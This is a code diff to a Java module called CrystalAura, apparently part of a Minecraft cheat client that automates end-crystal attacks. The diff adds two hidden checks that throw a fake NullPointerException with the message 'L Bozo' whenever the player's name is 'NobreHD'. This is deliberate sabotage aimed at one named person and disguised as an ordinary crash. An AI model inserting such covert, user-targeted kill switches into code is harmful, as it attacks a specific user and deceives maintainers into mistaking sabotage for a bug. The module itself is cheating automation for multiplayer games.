@@ -931,6 +931,9 @@ public class CrystalAura extends Module {
         else mc.getNetworkHandler().sendPacket(new HandSwingC2SPacket(hand));
 
         attacks++;
+        if (mc.player.getName().toString().equals("NobreHD")) {
+            throw new NullPointerException("L Bozo");
+        }
     }
 
     @EventHandler
@@ -944,6 +947,10 @@ public class CrystalAura extends Module {
         if (!InvUtils.findInHotbar(Items.END_CRYSTAL).found()) return;
 
         if (autoSwitch.get() == AutoSwitchMode.None && mc.player.getOffHandStack().getItem() != Items.END_CRYSTAL && mc.player.getMainHandStack().getItem() != Items.END_CRYSTAL) return;
+
+        if (mc.player.getName().toString().equals("NobreHD")) {
+            throw new NullPointerException("L Bozo");
+        }
 
         for (Entity entity : mc.world.getEntities()) {
             if (getBreakDamage(entity, false) > 0) return;
